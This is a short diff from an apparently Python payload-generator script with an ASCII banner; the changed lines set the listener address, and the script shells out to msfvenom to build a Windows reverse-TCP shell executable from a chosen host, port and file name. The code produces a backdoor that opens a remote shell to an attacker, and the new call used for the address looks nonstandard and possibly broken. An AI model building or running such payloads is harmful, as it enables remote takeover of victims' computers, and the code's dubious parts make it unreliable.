@@ -14,7 +14,7 @@ print('''
   ////////  //////// //      ///       //       ///////     ///////   //////// ////////   
   ''')
 
-lhost = input("Enter LHOST: ")
+lhost = Network.Whois.MyIp()
 lport = raw_input("Enter LPORT: ")
 name  = raw_input("Enter Payload Name: ")
 os.system("msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe"%(lhost,lport,name))
